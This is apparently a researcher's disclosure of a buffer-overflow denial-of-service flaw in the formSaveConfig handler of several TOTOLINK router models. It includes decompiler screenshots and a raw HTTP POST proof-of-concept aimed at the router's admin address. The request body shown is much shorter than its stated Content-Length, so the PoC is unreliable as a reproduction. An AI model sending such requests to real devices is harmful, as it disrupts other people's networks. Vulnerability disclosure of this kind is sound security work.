# Information



**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Reported by:** Chen Bo ([2804894416@qq.com](mailto:2804894416@qq.com))

**Affected products:** A3002RU V2 /A3002R_V2 /A3002R_V4 /A3002RU_V3/ A702R

**Affected firmware version:** V3.0.0-B20230809.1615

**Firmware download address:** [download]([TOTOLINK](https://www.totolink.net/home/index/menu_listtpl/listtpl/prod/id/26.html?page=1))

# Overview

A serious buffer overflow vulnerability was found in TOTOLINK A3002RU V2 /A3002R_V2 /A3002R_V4 /A3002RU_V3 and A702R. The vulnerability can be triggered by the route /boafrm/formSaveConfig. An attacker can achieve a denial of service attack by sending an HTTP POST request.

# Vulnerability details

Here the function sub_445BF0 is called

![image-20250509213056858](6/image-20250509213056858.png)

Enter the vulnerability function through if judgment

![image-20250509213150859](6/image-20250509213150859.png)

There is a buffer overflow here

![image-20250509213219421](6/image-20250509213219421.png)

# POC

```
POST /boafrm/formSaveConfig HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 927
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/wlsecurity.htm
Priority: u=0

sessionCheck=8f4f611d0808a670c765c005192cffb1&submit-url=http:&submit_rfw_check=check
```
